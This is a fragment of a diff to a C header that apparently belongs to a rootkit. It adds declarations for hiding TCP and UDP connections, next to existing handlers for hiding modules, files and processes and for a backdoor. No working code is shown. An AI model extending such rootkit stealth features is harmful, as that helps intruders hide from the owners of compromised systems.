@@ -15,6 +15,8 @@ int handle_modhide(unsigned long);
 int handle_filehide(unsigned long);
 int handle_openhide(unsigned long);
 int handle_pidhide(unsigned long);
+int handle_tcphide(unsigned long);
+int handle_udphide(unsigned long);
 int handle_backdoor(unsigned long);
 int handle_togglebd(unsigned long);
 int handle_logging(unsigned long);
